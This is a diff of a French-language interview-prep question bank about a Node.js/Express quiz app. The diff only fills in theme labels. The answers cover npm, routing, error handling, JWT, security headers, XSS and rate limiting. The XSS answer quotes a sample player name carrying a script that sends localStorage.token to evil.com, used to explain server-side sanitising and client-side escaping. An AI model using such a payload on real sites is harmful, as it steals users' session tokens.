+  {id:"p2_27",proj:"p2",num:27,category:`Node.js — Fondamentaux`,thematique:"Node.js",question:`Qu'est-ce que npm et à quoi sert le fichier <code>package.json</code> ?`,answer:`<p>npm (Node Package Manager) est le gestionnaire de paquets de Node.js. Il permet d'installer des bibliothèques tierces (Express, Socket.io, etc.) et de définir des scripts de lancement.</p>
 <p><code>package.json</code> est le fichier de configuration du projet : il liste les dépendances, la version du projet et les scripts disponibles.</p>
 <pre>{
   "name": "quizz-multijoueur",
@@ -293,7 +293,7 @@ fs.readFile('gros-fichier.txt', (err, data) =&gt; {
   }
 }</pre>
 <p>Le dossier <code>node_modules/</code> contient les fichiers installés — il n'est jamais versionné dans Git (trop lourd). On le recrée avec <code>npm install</code> à partir du <code>package.json</code>.</p>`,freq:"easy",},
-  {id:"p2_28",proj:"p2",num:28,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que <code>async/await</code> et pourquoi l'utilisez-vous ?`,answer:`<p><code>async/await</code> est une syntaxe pour écrire du code asynchrone (non-bloquant) de façon lisible, sans imbrication de callbacks.</p>
+  {id:"p2_28",proj:"p2",num:28,category:`Node.js — Fondamentaux`,thematique:"Node.js",question:`Qu'est-ce que <code>async/await</code> et pourquoi l'utilisez-vous ?`,answer:`<p><code>async/await</code> est une syntaxe pour écrire du code asynchrone (non-bloquant) de façon lisible, sans imbrication de callbacks.</p>
 <pre>// ❌ Ancienne syntaxe avec callbacks — "callback hell"
 bcrypt.hash(password, 12, function(err, hash) {
     db.run('INSERT INTO users ...', [hash], function(err) {
@@ -308,7 +308,7 @@ async function createUser(password) {
     res.json({ ok: true });
 }</pre>
 <p>Dans votre projet, <code>bcrypt.hash()</code> et <code>bcrypt.compare()</code> sont asynchrones (le calcul prend ~100ms). Le mot-clé <code>await</code> suspend la fonction le temps du calcul sans bloquer le reste du serveur.</p>`,freq:"hot",},
-  {id:"p2_29",proj:"p2",num:29,category:`Express.js — Approfondissement`,thematique:"",question:`Comment fonctionne le routage dans Express et qu'est-ce qu'un <code>Router</code> ?`,answer:`<p>Dans Express, une route associe une URL + un verbe HTTP à une fonction handler. Un <code>Router</code> est un mini-Express qui regroupe des routes liées pour les organiser dans des fichiers séparés.</p>
+  {id:"p2_29",proj:"p2",num:29,category:`Express.js — Approfondissement`,thematique:"Express.js",question:`Comment fonctionne le routage dans Express et qu'est-ce qu'un <code>Router</code> ?`,answer:`<p>Dans Express, une route associe une URL + un verbe HTTP à une fonction handler. Un <code>Router</code> est un mini-Express qui regroupe des routes liées pour les organiser dans des fichiers séparés.</p>
 <pre>// src/routes/quiz.js — routeur dédié aux questions
 const router = express.Router();
 
@@ -322,7 +322,7 @@ module.exports = router;
 // server.js — montage du routeur
 app.use('/api/v1/quiz', require('./src/routes/quiz'));</pre>
 <p>Chaque technologie a son fichier : <code>auth.js</code>, <code>quiz.js</code>, <code>categories.js</code>, <code>games.js</code>, <code>admin.js</code>, <code>daily.js</code>. Cela évite un seul fichier <code>server.js</code> de 2000 lignes.</p>`,freq:"hot",},
-  {id:"p2_30",proj:"p2",num:30,category:`Express.js — Approfondissement`,thematique:"",question:`Qu'est-ce que <code>req</code>, <code>res</code> et <code>next</code> dans Express ?`,answer:`<p>Ce sont les trois paramètres que reçoit chaque middleware ou handler de route dans Express :</p>
+  {id:"p2_30",proj:"p2",num:30,category:`Express.js — Approfondissement`,thematique:"Express.js",question:`Qu'est-ce que <code>req</code>, <code>res</code> et <code>next</code> dans Express ?`,answer:`<p>Ce sont les trois paramètres que reçoit chaque middleware ou handler de route dans Express :</p>
 <ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
 <li><b><code>req</code></b> (request) : tout ce qui vient du client — URL, paramètres, body, headers, cookies</li>
 <li><b><code>res</code></b> (response) : les méthodes pour répondre au client — <code>res.json()</code>, <code>res.status()</code>, <code>res.send()</code></li>
@@ -337,7 +337,7 @@ async function getQuestions(req, res) {
     const questions = stmts.getByDifficulty.all(difficulty);
     res.json(questions);  // Répond avec le tableau JSON
 }</pre>`,freq:"easy",},
-  {id:"p2_31",proj:"p2",num:31,category:`Express.js — Approfondissement`,thematique:"",question:`Comment gérez-vous les erreurs dans Express ?`,answer:`<p>Dans Express, un middleware de gestion d'erreurs prend 4 paramètres : <code>(err, req, res, next)</code>. Il intercepte toutes les erreurs non gérées et retourne une réponse propre au lieu de planter le serveur.</p>
+  {id:"p2_31",proj:"p2",num:31,category:`Express.js — Approfondissement`,thematique:"Express.js",question:`Comment gérez-vous les erreurs dans Express ?`,answer:`<p>Dans Express, un middleware de gestion d'erreurs prend 4 paramètres : <code>(err, req, res, next)</code>. Il intercepte toutes les erreurs non gérées et retourne une réponse propre au lieu de planter le serveur.</p>
 <pre>// Dans une route — on passe l'erreur à next()
 app.get('/api/v1/quiz/:id', async (req, res, next) =&gt; {
     try {
@@ -356,7 +356,7 @@ app.use((err, req, res, next) =&gt; {
     res.status(status).json({ error: err.message || 'Erreur serveur' });
 });</pre>
 <p>Cela évite que le serveur affiche une stacktrace complète (qui peut révéler des informations sensibles) et retourne toujours un JSON cohérent même en cas d'erreur inattendue.</p>`,freq:"med",},
-  {id:"p2_32",proj:"p2",num:32,category:`JWT & Authentification — Approfondissement`,thematique:"",question:`Quelle est la structure d'un JWT ? Que contiennent les 3 parties ?`,answer:`<p>Un JWT est une chaîne de texte en 3 parties séparées par des points : <code>header.payload.signature</code>. Chaque partie est encodée en Base64url (pas chiffrée — lisible par n'importe qui).</p>
+  {id:"p2_32",proj:"p2",num:32,category:`JWT & Authentification — Approfondissement`,thematique:"JWT & Sécurité",question:`Quelle est la structure d'un JWT ? Que contiennent les 3 parties ?`,answer:`<p>Un JWT est une chaîne de texte en 3 parties séparées par des points : <code>header.payload.signature</code>. Chaque partie est encodée en Base64url (pas chiffrée — lisible par n'importe qui).</p>
 <pre>// Exemple de token JWT (raccourci)
 eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwiZXhwIjoxNzAwMDAwfQ.abc123
 
@@ -372,7 +372,7 @@ eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwiZXhwIjoxNzAwMDAwfQ.abc123
 // HMAC-SHA256(base64(header) + "." + base64(payload), JWT_SECRET)
 // Seul le serveur peut la recalculer → prouve l'authenticité</pre>
 <p><b>Point important</b> : le payload est lisible par tout le monde (il est juste encodé, pas chiffré). Ne jamais y mettre un mot de passe ou une donnée confidentielle. La signature garantit que personne n'a modifié le token.</p>`,freq:"hot",},
-  {id:"p2_33",proj:"p2",num:33,category:`JWT & Authentification — Approfondissement`,thematique:"",question:`Comment un attaquant pourrait-il abuser d'un JWT ? Quelles protections avez-vous mises en place ?`,answer:`<p>Deux risques principaux :</p>
+  {id:"p2_33",proj:"p2",num:33,category:`JWT & Authentification — Approfondissement`,thematique:"JWT & Sécurité",question:`Comment un attaquant pourrait-il abuser d'un JWT ? Quelles protections avez-vous mises en place ?`,answer:`<p>Deux risques principaux :</p>
 <p><b>1. Vol du token</b> (XSS) : si un script malveillant s'exécute sur la page, il peut lire le token et l'envoyer à un attaquant.</p>
 <p><b>2. Durée de vie trop longue</b> : si un token valable 30 jours est volé, l'attaquant a 30 jours d'accès.</p>
 <pre>// Protection 1 : Expiration courte (8h)
@@ -390,7 +390,7 @@ function esc(str) {
 // Protection 3 : HTTPS en production → token chiffré en transit
 // Protection 4 : sanitizeStr() côté Socket.io → pas d'injection via les noms de joueurs</pre>
 <p>En développement local, le risque XSS est faible. En production publique, on ajouterait le flag <code>httpOnly</code> sur le cookie pour rendre le token inaccessible depuis JavaScript.</p>`,freq:"med",},
-  {id:"p2_34",proj:"p2",num:34,category:`Helmet.js & Sécurité HTTP`,thematique:"",question:`Qu'est-ce qu'un header HTTP de sécurité ? Donnez 3 exemples concrets.`,answer:`<p>Un header HTTP de sécurité est une instruction envoyée par le serveur dans sa réponse pour dire au navigateur comment se comporter face à certains risques.</p>
+  {id:"p2_34",proj:"p2",num:34,category:`Helmet.js & Sécurité HTTP`,thematique:"Sécurité HTTP",question:`Qu'est-ce qu'un header HTTP de sécurité ? Donnez 3 exemples concrets.`,answer:`<p>Un header HTTP de sécurité est une instruction envoyée par le serveur dans sa réponse pour dire au navigateur comment se comporter face à certains risques.</p>
 <pre>HTTP/1.1 200 OK
 Content-Security-Policy: default-src 'self'
 X-Frame-Options: SAMEORIGIN
@@ -399,7 +399,7 @@ X-Content-Type-Options: nosniff</pre>
 <p><b>X-Frame-Options: SAMEORIGIN</b> : empêche votre site d'être intégré dans une <code>&lt;iframe&gt;</code> sur un autre domaine. Protège contre le <em>clickjacking</em> (superposer une iframe invisible pour piéger les clics).</p>
 <p><b>X-Content-Type-Options: nosniff</b> : interdit au navigateur de "deviner" le type d'un fichier. Sans lui, un fichier texte contenant du HTML pourrait être exécuté comme HTML.</p>
 <p>Helmet.js active tout ça en une ligne : <code>app.use(helmet())</code>.</p>`,freq:"med",},
-  {id:"p2_35",proj:"p2",num:35,category:`Helmet.js & Sécurité HTTP`,thematique:"",question:`Qu'est-ce qu'une attaque XSS et comment l'avez-vous prévenue ?`,answer:`<p>XSS (Cross-Site Scripting) : un attaquant injecte du code JavaScript malveillant dans une page. Quand les autres utilisateurs chargent cette page, le script s'exécute dans leur navigateur — il peut voler leur token JWT, rediriger vers un faux site, etc.</p>
+  {id:"p2_35",proj:"p2",num:35,category:`Helmet.js & Sécurité HTTP`,thematique:"Sécurité HTTP",question:`Qu'est-ce qu'une attaque XSS et comment l'avez-vous prévenue ?`,answer:`<p>XSS (Cross-Site Scripting) : un attaquant injecte du code JavaScript malveillant dans une page. Quand les autres utilisateurs chargent cette page, le script s'exécute dans leur navigateur — il peut voler leur token JWT, rediriger vers un faux site, etc.</p>
 <pre>// Scénario d'attaque : un joueur saisit ce nom
 // "Alice&lt;script&gt;fetch('https://evil.com?t='+localStorage.token)&lt;/script&gt;"
 
@@ -416,7 +416,7 @@ function sanitizeStr(str) {
     return String(str).replace(/[&lt;&gt;"'\`]/g, '').trim().slice(0, 30);
 }</pre>
 <p>Double protection : <code>sanitizeStr()</code> côté serveur (nettoyage à l'entrée) + <code>esc()</code> côté client (échappement à l'affichage).</p>`,freq:"hot",},
-  {id:"p2_36",proj:"p2",num:36,category:`express-rate-limit — Approfondissement`,thematique:"",question:`Qu'est-ce qu'une attaque par force brute et comment le rate limiting la bloque-t-il ?`,answer:`<p>Une attaque par force brute consiste à essayer des milliers de mots de passe à la suite en espérant tomber sur le bon. Sans protection, un script peut faire 1000 tentatives à la seconde.</p>
+  {id:"p2_36",proj:"p2",num:36,category:`express-rate-limit — Approfondissement`,thematique:"Sécurité HTTP",question:`Qu'est-ce qu'une attaque par force brute et comment le rate limiting la bloque-t-il ?`,answer:`<p>Une attaque par force brute consiste à essayer des milliers de mots de passe à la suite en espérant tomber sur le bon. Sans protection, un script peut faire 1000 tentatives à la seconde.</p>
 <pre>// Configuration dans votre projet
 const loginLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,  // Fenêtre de 15 minutes
@@ -427,7 +427,7 @@ const loginLimiter = rateLimit({
 
 app.post('/api/v1/auth/login', loginLimiter, handleLogin);</pre>
 <p>Avec cette configuration, un attaquant doit attendre 15 minutes après 10 échecs. Pour tester un million de mots de passe, il lui faudrait 25 ans. Bcrypt (12 rounds) ralentit encore davantage : chaque tentative prend ~300ms côté serveur.</p>`,freq:"hot",},
-  {id:"p2_37",proj:"p2",num:37,category:`express-rate-limit — Approfondissement`,thematique:"",question:`Quelle est la différence entre <code>dependencies</code> et <code>devDependencies</code> dans <code>package.json</code> ?`,answer:`<p><code>dependencies</code> : bibliothèques nécessaires au fonctionnement de l'application en production (Express, Socket.io, bcrypt…).<br/>
+  {id:"p2_37",proj:"p2",num:37,category:`express-rate-limit — Approfondissement`,thematique:"Sécurité HTTP",question:`Quelle est la différence entre <code>dependencies</code> et <code>devDependencies</code> dans <code>package.json</code> ?`,answer:`<p><code>dependencies</code> : bibliothèques nécessaires au fonctionnement de l'application en production (Express, Socket.io, bcrypt…).<br/>
 <code>devDependencies</code> : bibliothèques uniquement nécessaires pendant le développement, jamais déployées (Jest, Supertest, ESLint…).</p>
 <pre>// Installation en production (pas de devDeps)
 npm install --omit=dev
@@ -450,7 +450,7 @@ npm install
     "supertest": "^7.0.0",
     "pkg":       "^5.8.0"
 }</pre>`,freq:"easy",},
-  {id:"p2_38",proj:"p2",num:38,category:`pkg (Vercel) — Approfondissement`,thematique:"",question:`Comment pkg embarque-t-il les fichiers statiques du dossier <code>public/</code> ?`,answer:`<p>pkg crée un "snapshot" virtuel du système de fichiers à l'intérieur du binaire. Pour que les fichiers HTML, CSS et JS du dossier <code>public/</code> soient accessibles, ils doivent être déclarés dans <code>package.json</code> sous la clé <code>pkg.assets</code>.</p>
+  {id:"p2_38",proj:"p2",num:38,category:`pkg (Vercel) — Approfondissement`,thematique:"pkg (Vercel)",question:`Comment pkg embarque-t-il les fichiers statiques du dossier <code>public/</code> ?`,answer:`<p>pkg crée un "snapshot" virtuel du système de fichiers à l'intérieur du binaire. Pour que les fichiers HTML, CSS et JS du dossier <code>public/</code> soient accessibles, ils doivent être déclarés dans <code>package.json</code> sous la clé <code>pkg.assets</code>.</p>
 <pre>// package.json — configuration pkg
 "pkg": {
     "assets": [
@@ -464,7 +464,7 @@ npm install
 app.use(express.static(path.join(__dirname, 'public')));
 // pkg résout __dirname vers le snapshot virtuel automatiquement</pre>
 <p>Résultat : l'exécutable contient Node.js + tout le code + tous les assets. Une seule personne peut faire tourner le serveur de quiz en double-cliquant sur le <code>.exe</code>, sans installer quoi que ce soit.</p>`,freq:"med",},
-  {id:"p2_39",proj:"p2",num:39,category:`pkg (Vercel) — Approfondissement`,thematique:"",question:`Quelle est la différence entre <code>require()</code> et <code>import</code> en JavaScript ?`,answer:`<p>Ce sont deux systèmes de modules différents :</p>
+  {id:"p2_39",proj:"p2",num:39,category:`pkg (Vercel) — Approfondissement`,thematique:"pkg (Vercel)",question:`Quelle est la différence entre <code>require()</code> et <code>import</code> en JavaScript ?`,answer:`<p>Ce sont deux systèmes de modules différents :</p>
 <ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
 <li><b>CommonJS (<code>require</code>)</b> : le système historique de Node.js — synchrone, fonctionne partout</li>
 <li><b>ES Modules (<code>import</code>)</b> : le standard moderne JavaScript — asynchrone, utilisable dans les navigateurs</li>
@@ -479,7 +479,7 @@ import { myName, myCode } from './mp-state.js';
 import { renderQuestion } from './mp-ui.js';
 export function resetToLobby() { ... }</pre>
 <p>Dans votre projet, vous utilisez les deux : CommonJS côté serveur (Node.js, compatibilité pkg) et ES Modules côté front-end (standard navigateur moderne, meilleur découpage en 7 modules).</p>`,freq:"med",},
-  {id:"p2_40",proj:"p2",num:40,category:`pkg (Vercel) — Approfondissement`,thematique:"",question:`Comment avez-vous sécurisé les données côté Socket.io contre l'injection ?`,answer:`<p>Toutes les données reçues via Socket.io viennent des clients — elles ne sont jamais fiables. Trois niveaux de validation ont été appliqués :</p>
+  {id:"p2_40",proj:"p2",num:40,category:`pkg (Vercel) — Approfondissement`,thematique:"pkg (Vercel)",question:`Comment avez-vous sécurisé les données côté Socket.io contre l'injection ?`,answer:`<p>Toutes les données reçues via Socket.io viennent des clients — elles ne sont jamais fiables. Trois niveaux de validation ont été appliqués :</p>
 <pre>// Niveau 1 : sanitizeStr() — nettoie les chaînes reçues
 // Retire les caractères HTML dangereux, limite la longueur à 30 car.
 function sanitizeStr(str) {
